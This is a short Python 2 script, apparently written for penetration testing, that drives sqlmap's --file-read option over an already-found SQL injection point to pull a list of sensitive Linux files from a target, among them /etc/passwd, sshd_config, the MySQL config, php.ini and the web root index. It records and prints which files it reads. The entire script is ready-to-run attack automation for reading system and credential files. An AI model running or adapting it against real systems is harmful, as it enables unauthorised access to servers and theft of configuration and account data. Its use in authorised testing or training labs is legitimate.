
#the whole program relies on you having identified a sql injection on linux running as a privileged user
#which will use sqlmap on an already discovered sqli vector allowing faster processing 
import subprocess

local_files_found = []
file_paths = ["/etc/hosts",
              "/etc/passwd",
              "/etc/mysql/my.cnf",
              "/var/log/mysqld.log",
              "/etc/httpd/conf/httpd.conf",
              "/etc/ssh/sshd_config",
              "/etc/php5/apache2/php.ini",
              "/etc/php5/apache2/conf.d",
              "/var/www/index.php"
              ]





def execute_file_search(sql_map_cmd,target,file_path):
    local_file = {"Target":target,"FilePath":file_path}
    p = subprocess.Popen(sql_map_cmd, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    p_status = p.wait()
    if "(same file)" in output:
       print "Command output : ", output
       print "Command exit status/return code : ", p_status
       local_files_found.append(local_file)

def file_reader():
    sql_map_path = "C:\\Users\\pentesterlab\\Desktop\\sqlmapproject-sqlmap\\"
    for paths in file_paths:
        target = "http://192.168.1.23/admin/injectable_page.php?query=1"
        sqlmap_string = sql_map_path+"""sqlmap.py -u """+ "\""+target+"\""+ " --file-read="+"\"" + paths + "\" --batch"
        print sqlmap_string
        try:
           execute_file_search(sqlmap_string,target,paths)
        except:
           pass
    


    
file_reader()

for files_found in local_files_found:
    print files_found
